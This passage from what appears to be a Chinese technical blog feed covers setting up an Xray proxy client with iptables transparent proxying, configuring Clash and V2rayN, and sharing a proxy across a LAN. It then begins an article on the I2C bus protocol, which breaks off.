class="punctuation">:</span> <span class="number">1350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tti&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;uplinkCapacity&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;downlinkCapacity&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;congestion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;readBufferSize&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeBufferSize&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;header&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wechat-video&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;seed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9yPvIsO0&quot;</span> <span class="comment">//kcp seed</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;mux&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;concurrency&quot;</span><span class="punctuation">:</span> <span class="number">-1</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dns&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="comment">//dns服务器</span></span><br><span class="line">    <span class="attr">&quot;hosts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;dns.google&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;servers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https+local://dns.alidns.com/dns-query&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;domains&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;domain:geosite:cn&quot;</span><span class="punctuation">,</span><span class="string">&quot;bing.com&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;expectIPs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;geoip:cn&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;skipFallback&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https+local://doh.pub/dns-query&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;domains&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;domain:geosite:cn&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;expectIPs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;geoip:cn&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;skipFallback&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;https://1.1.1.1/dns-query&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;https://1.0.0.1/dns-query&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;https://dns.google/dns-query&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;routing&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;domainStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IPIfNonMatch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;field&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inboundTag&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;all-in&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dns-out&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;field&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;8.8.8.8&quot;</span><span class="punctuation">,</span> <span class="string">&quot;1.1.1.1&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;proxy&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;field&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;geosite:category-ads-all&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;block&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;field&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;geosite:geolocation-!cn&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;proxy&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="4-启动客户端"><a href="#4-启动客户端" class="headerlink" title="4.启动客户端"></a>4.启动客户端</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start xray.service</span><br></pre></td></tr></table></figure><h5 id="5-配置透明代理（可选）"><a href="#5-配置透明代理（可选）" class="headerlink" title="*5.配置透明代理（可选）"></a>*5.配置透明代理（可选）</h5><h6 id="5-1-配置路由转发"><a href="#5-1-配置路由转发" class="headerlink" title="5.1 配置路由转发"></a>5.1 配置路由转发</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment">#添加</span></span><br><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><h6 id="5-2-配置流量重定向-使用iptables"><a href="#5-2-配置流量重定向-使用iptables" class="headerlink" title="5.2 配置流量重定向(使用iptables)"></a>5.2 配置流量重定向(使用iptables)</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">iptables -t mangle -N XRAY</span><br><span class="line"><span class="comment">#法网内网服务器的数据包不转发</span></span><br><span class="line">iptables -t mangle -A XRAY -d 10.0.0.0/8 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 100.64.0.0/10 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 127.0.0.0/8 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 169.254.0.0/16 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 172.16.0.0/12 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 192.0.0.0/24 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 224.0.0.0/4 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 240.0.0.0/4 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 255.255.255.255/32 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 192.168.0.0/16 -p tcp ! --dport 53 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -d 192.168.0.0/16 -p udp ! --dport 53 -j RETURN</span><br><span class="line"><span class="comment">#ssh数据包不转发，不配置会导致ssh连接不上</span></span><br><span class="line">iptables -t mangle -A XRAY -p tcp --dport 22 -j RETURN</span><br><span class="line"><span class="comment">#ocserv数据包不转发</span></span><br><span class="line">iptables -t mangle -A XRAY -p tcp --dport 8443 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY -p udp --dport 8443 -j RETURN</span><br><span class="line"><span class="comment">#数据包转发到本地12345端口</span></span><br><span class="line">iptables -t mangle -A XRAY -p tcp -j TPROXY --on-port 12345 --tproxy-mark 1</span><br><span class="line">iptables -t mangle -A XRAY -p udp -j TPROXY --on-port 12345 --tproxy-mark 1</span><br><span class="line"><span class="comment">#将所有的即将路由的流量重定向到XRAY链（实现局域网其他设备透明代理)</span></span><br><span class="line">iptables -t mangle -A PREROUTING -j XRAY</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建XRAY_SELF链</span></span><br><span class="line">iptables -t mangle -N XRAY_SELF</span><br><span class="line"></span><br><span class="line"><span class="comment">#内网ip段直连</span></span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 10.0.0.0/8 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 100.64.0.0/10 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 127.0.0.0/8 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 169.254.0.0/16 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 172.16.0.0/12 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 192.0.0.0/24 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 224.0.0.0/4 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 240.0.0.0/4 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 255.255.255.255/32 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 192.168.0.0/16 -p tcp ! --dport 53 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -d 192.168.0.0/16 -p udp ! --dport 53 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -p tcp --sport 22 -j RETURN</span><br><span class="line"><span class="comment">#这里之所以要跳过8443端口，是因为后面需要通过ocserv服务器中转，8443是这里配置的ocserv的监听端口</span></span><br><span class="line">iptables -t mangle -A XRAY_SELF -p tcp --sport 8443 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -p udp --sport 8443 -j RETURN</span><br><span class="line">iptables -t mangle -A XRAY_SELF -m mark --mark 2 -j RETURN</span><br><span class="line"><span class="comment">#tproxy有一个特性，所有经OUTPUT链打标签的流量将重新发送到PREROUTING链上重新路由，因此这里将标签打1，流量会重新到达PREROUTING链</span></span><br><span class="line">iptables -t mangle -A XRAY_SELF -p tcp -j MARK --set-mark 1</span><br><span class="line">iptables -t mangle -A XRAY_SELF -p udp -j MARK --set-mark 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#将本地OUTPUT链的流量重定向到XRAY_SELF链，实现本地主机透明代理</span></span><br><span class="line">iptables -t mangle -A OUTPUT -j XRAY_SELF</span><br><span class="line"><span class="comment">#添加策略路由</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#防止端口暴露，阻止外部连接代理端口(尤其实在云服务器上，如果暴露端口，很可能会被云服务器厂商警告)</span></span><br><span class="line">iptables -t filter -A INPUT -p tcp --dport 12345 ! -i lo -j DROP</span><br><span class="line">iptables -t filter -A INPUT -p udp --dport 12345 ! -i lo -j DROP</span><br><span class="line"><span class="comment">#防ping</span></span><br><span class="line">iptables -t filter -A INPUT -p icmp --icmp-type echo-request -j DROP</span><br><span class="line">iptables -t filter -A INPUT -p icmp --icmp-type echo-reponse -j DROP</span><br></pre></td></tr></table></figure><h6 id="5-3-配置路由策略"><a href="#5-3-配置路由策略" class="headerlink" title="5.3 配置路由策略"></a>5.3 配置路由策略</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip route add <span class="built_in">local</span> default dev lo table 100 <span class="comment"># 添加路由表 100（匹配到这个规则的数据包都被视为lo网卡发出的</span></span><br><span class="line">sudo ip rule add fwmark 1 table 100 <span class="comment"># 为路由表 100 设定规则</span></span><br></pre></td></tr></table></figure><h6 id="5-4-设置开机自启动-可选"><a href="#5-4-设置开机自启动-可选" class="headerlink" title="*5.4 设置开机自启动(可选)"></a>*5.4 设置开机自启动(可选)</h6><p>保存iptables规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&quot;iptables-save &gt; /etc/iptabels/iptables.rules&quot;</span></span><br></pre></td></tr></table></figure><p>创建service文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/lib/system/system/iptables.service</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=IPv4 Packet Filtering Framework</span><br><span class="line">Before=network-pre.target</span><br><span class="line">Wants=network-pre.target</span><br><span class="line">After=network.target xray.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Type=simple</span><br><span class="line">ExecStartPre=/bin/bash -c &quot;sudo ip route add local default dev lo table 100; sudo ip rule add fwmark 1 table 100&quot;</span><br><span class="line">ExecStart=/usr/sbin/iptables-restore  /etc/iptables/iptables.rules</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置xray开机自启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> xray</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置iptables开机自动重载规则</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> iptables</span><br></pre></td></tr></table></figure><h5 id="6-通过ocserv服务器进行中转（可选）"><a href="#6-通过ocserv服务器进行中转（可选）" class="headerlink" title="*6.通过ocserv服务器进行中转（可选）"></a>*6.通过ocserv服务器进行中转（可选）</h5><p>为了使用更加的方便，可以将xray客户端搭建在云服务器上，然后再云服务器上搭建ocserv服务端，通过配置路由规则，将ocserv客户端的流量通过ocserv服务器用xray进行转发，实现科学上网</p><p>整个技术架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram  </span><br><span class="line">OcservClient-&gt;&gt;OcservServer:Crypto(DTLS)</span><br><span class="line">OcservServer-&gt;&gt;XrayClient:Origin</span><br><span class="line">XrayClient-&gt;&gt;XrayServer:Crypto(VLESS+kcp+tls)</span><br><span class="line">XrayServer-&gt;&gt;RealServer:Origin</span><br></pre></td></tr></table></figure><p>实现通过ocserv进行中转的前提是服务器已经配置好透明代理，只要配置好透明代理，服务器上所有的流量都会走xray进行路由匹配，如果检测到需要路由的流量，xray会对流量进行自动代理。因此要实现通过ocserv对流量进行中转只需要将服务器的ocserv配置好即可，并且将ocserv和客户端通信的流量从xray过滤即可，防止ocserv直连客户端的流量同样走代理</p><h3 id="6-常用的客户端软件配置-基于windows"><a href="#6-常用的客户端软件配置-基于windows" class="headerlink" title="6.常用的客户端软件配置(基于windows)"></a>6.常用的客户端软件配置(基于windows)</h3><h4 id="6-1-基于Windows"><a href="#6-1-基于Windows" class="headerlink" title="6.1 基于Windows"></a>6.1 基于Windows</h4><h5 id="6-1-1-ClashForWindows"><a href="#6-1-1-ClashForWindows" class="headerlink" title="6.1.1.ClashForWindows"></a>6.1.1.ClashForWindows</h5><p>Clash for Windows是代理工具Clash在Windows系统的唯一图形客户端，同时还支持Windows、Linux、macOS三大系统，功能强大且支持多种代理协议，如Shadowsocks(SS)、ShadowsocksR(SSR)、Socks、Snell、V2Ray、Trojan等代理协议。以下是配置步骤</p><p>1.获取ClashForWindows<br><a href="https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.20.11/Clash.for.Windows.Setup.0.20.11.exe">下载windows下clash客户端💻</a><br>2.点解clash主界面的profile选项<br><img src="/images/clash1.png" alt="点解profile"><br>3.输入订阅链接(由购买的机场提供)后并点击下载<br><img src="/images/clash2.png" alt="输入订阅链接"><br>4.点击下载好的配置文件<br><img src="/images/clash3.png" alt="点击下载好的配置文件"><br>5.返回节点列表，进行刷新，选择合适的可用的节点<br><img src="/images/clash4.png" alt="选择合适的节点"></p><h5 id="6-1-2-V2rayN"><a href="#6-1-2-V2rayN" class="headerlink" title="6.1.2.V2rayN"></a>6.1.2.V2rayN</h5><p>v2rayN是Windows系统下的代理软件客户端，功能强大且支持多种代理协议，如VMess、VLESS、Trojan、Socks、Shadowsocks等代理协议<br>1.获取V2rayN文件<br><a href="https://github.com/2dust/v2rayN/releases/download/6.21/v2rayN-With-Core.zip">下载V2rayN</a></p><p>2.解压并启动V2rayN<br><img src="/images/v2rayn1.png" alt="解压">3.添加订阅连接<br><img src="/images/v2rayn2.png" alt="添加订阅链接"><br>4.返回节点列表，选择节点<br><img src="/images/v2rayn3.png" alt="选择节点"></p><h4 id="6-2-基于Linux"><a href="#6-2-基于Linux" class="headerlink" title="6.2.基于Linux"></a>6.2.基于Linux</h4><h5 id="6-2-1-Clash"><a href="#6-2-1-Clash" class="headerlink" title="6.2.1 Clash"></a>6.2.1 Clash</h5><p>1.获取Linux平台下clash可执行文件<br><a href="https://github.com/Dreamacro/clash/releases/download/v1.12.0/clash-linux-amd64-v1.12.0.gz">下载Linux下clash客户端💻</a><br>2.解压配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解压</span></span><br><span class="line">gunzip clash-linux-amd64-v1.12.0.gz</span><br><span class="line"><span class="comment">#重命名并附加可执行权限</span></span><br><span class="line"><span class="built_in">mv</span> clash-linux-amd64-v1.12.0 clash &amp;&amp; <span class="built_in">chmod</span> +x clash &amp;&amp; <span class="built_in">mv</span> clash /usr/local/bin/clash</span><br><span class="line"><span class="comment">#创建clash配置文件目录</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/clash</span><br></pre></td></tr></table></figure><p>3.获取配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o /usr/local/etc/clash/config.yaml <span class="variable">$URL</span> <span class="comment">#URL由机场进行提供</span></span><br></pre></td></tr></table></figure><p>4.第一次启动clash(去下载geoip库)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clash -d /usr/local/etc/clash</span><br></pre></td></tr></table></figure><p>5.使用systemd管理clash启动与停止</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/clash.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=A rule based proxy <span class="keyword">in</span> Go <span class="keyword">for</span> %i.</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=%i</span><br><span class="line">Restart=on-abort</span><br><span class="line">ExecStart=/usr/local/bin/clash -d /usr/local/etc/clash <span class="comment">#根据实际clash可执行文件和clash配置文件所在的位置自行修改</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>6.启动clash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start clash.service</span><br></pre></td></tr></table></figure><p>7.*配置透明代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N CLASH_TCP_RULE</span><br><span class="line"><span class="comment">#创建新的规则链</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -j CLASH_TCP_RULE</span><br><span class="line">iptables -t nat -A CLASH_TCP_RULE -p tcp -d 192.168.0.0/16 -j RETURN</span><br><span class="line"><span class="comment">#不对局域网地址进行转发</span></span><br><span class="line">iptables -t nat -A CLASH_TCP_RULE -p tcp -j REDIRECT --to-ports 1082(此为clash配置的透明代理端口)</span><br></pre></td></tr></table></figure><h3 id="7-如何借助局域网已经科学上网设备设备实现科学上网"><a href="#7-如何借助局域网已经科学上网设备设备实现科学上网" class="headerlink" title="7.如何借助局域网已经科学上网设备设备实现科学上网?"></a>7.如何借助局域网已经科学上网设备设备实现科学上网?</h3><h4 id="1-代理模式"><a href="#1-代理模式" class="headerlink" title="1.代理模式"></a>1.代理模式</h4><p>此次实例仍然基于clash进行演示。<br>对于不便于装上科学上网的客户端的设备可以使用局域网已经实现科学上网的设备实现科学上网,基本原理如下<br><img src="/images/clashallowlan.png" alt="大体流程"><br>配置流程</p><h6 id="1-开启clash的局域网访问"><a href="#1-开启clash的局域网访问" class="headerlink" title="1.开启clash的局域网访问"></a>1.开启clash的局域网访问</h6><p><img src="/images/clash5.png" alt="提前准备"></p><h6 id="2-获取主机的ip和端口"><a href="#2-获取主机的ip和端口" class="headerlink" title="2.获取主机的ip和端口"></a>2.获取主机的ip和端口</h6><p>1.获取ip<br>对于windows系统，Win+R键,输入cmd,输入ipconfig<br><img src="/images/cmd.png" alt="win+r"></p><p><img src="/images/ip.png" alt="获取ip"><br>由于我这里连接的是网线,因此有效的ip应该是以太网，如果你使用的是wifi连接,则关注wlan连接的ip信息。</p><h6 id="3-手机上配置相关代理"><a href="#3-手机上配置相关代理" class="headerlink" title="3.手机上配置相关代理"></a>3.手机上配置相关代理</h6><p><img src="/images/proxy1.png" alt="点击代理"><br><img src="/images/proxy2.png" alt="点击手动"><br><img src="/images/proxy3.png" alt="输入主机名和端口"></p><p>主机名为之前查看的ip地址，端口号为clash主界面配置的端口号<br><strong>注意事项</strong><br>配置完成即可实现科学上网，如果不行，请检查电脑端clash是否科学上网正常。</p><h4 id="2-网关模式"><a href="#2-网关模式" class="headerlink" title="2.网关模式"></a>2.网关模式</h4><p>网关模式即透明代理模式，需要配置好科学上网的设备上配置好路由转发和透明代理，其他的设备只需要将网关修改为目标主机的ip地址，即可实现科学上网</p><p>对于节点机场购买可以参考<a href="https://www.duyaoss.com/">毒药官网</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I2C协议</title>
      <link href="/2022/12/21/I2C%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/12/21/I2C%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="I2C协议"><a href="#I2C协议" class="headerlink" title="I2C协议"></a>I2C协议</h1><h3 id="1-什么是I2C协议？"><a href="#1-什么是I2C协议？" class="headerlink" title="1.什么是I2C协议？"></a>1.什么是I2C协议？</h3><p>I2C总线是PHLIPS公司在20世纪80年代推出的一种串行总线。具有引脚少，硬件实现简单，可扩展性强的优点，I2C支持多主控，总线上的任意一个设备能够进行发送&#x2F;接收数据的设备都可以占领总线。当然，任意时间点上只能存在一个主控。</p><h3 id="2-I2C接线图"><a href="#2-I2C接线图" class="headerlink" title="2.I2C接线图"></a>2.I2C接线图</h3><p>I2C通讯只有两根线一根是SCL，一根是SDA，SCL为同步时钟线用于传递时钟信号，SDA为数据线用于传递数据，因此只有一根线用于实际数据的收发，因此I2C也是一种半双工通讯协议。<br><img src="/images/i2c.png" alt="i2c"></p><h3 id="3-I2C通讯特点"><a href="#3-I2C通讯特点" class="headerlink" title="3.I2C通讯特点"></a>3.I2C通讯特点</h3><p>起始信号和结束信号都是由主机发出的，起始信号一旦发出，总线就处于被占用状态，在结束信号一旦发出后，总线就处于空闲状态。</p><h5 id="1-起始信号"><a href="#1-起始信号" class="headerlink" title="1.起始信号"></a>1.起始信号</h5><p>在SCL时钟线为高电平期间，数据线由高电平往低电平转变为起始信号。<br><img src="/image/i2cstart.png" alt="I2C起始信号"></p><h5 id="2-结束信号"><a href="#2-结束信号" class="headerlink" title="2.结束信号"></a>2.结束信号</h5><p>在SCL时钟线为高电平期间，数据线由低电平往高电平转变为结束信号。<br><img src="/image/i2cstop.png" alt="I2C结束信号"><br>起始信号后</p><h5 id="3-注意事项"><a href="#3-注意事项" class="headerlink" title="3.注意事项"></a>3.注意事项</h5><p>(1) 接收器件接收到一个完整的数据字节后，可能需要完成一些其他工作，如处理内部接收中断服务函数等，这就无法立即接收下一字节的数据，这时接收器件可将SCL线拉成低电平，从而使得主机处于等待状态。直至接收器件准备好接收下一字节数据时再释放SCL线使之为高电平。</p><p>(2) 连接到I2C总线上的器件，若具有I2C总线控制器那么很硬件会自动检测到起始、结束信号，而对于不具备I2C总线控制器的器件(单片机)来说，需要在每个时钟周期内保证对数据线SDA采样两次，捕获是否接收到起始&#x2F;结束信号。</p><h5 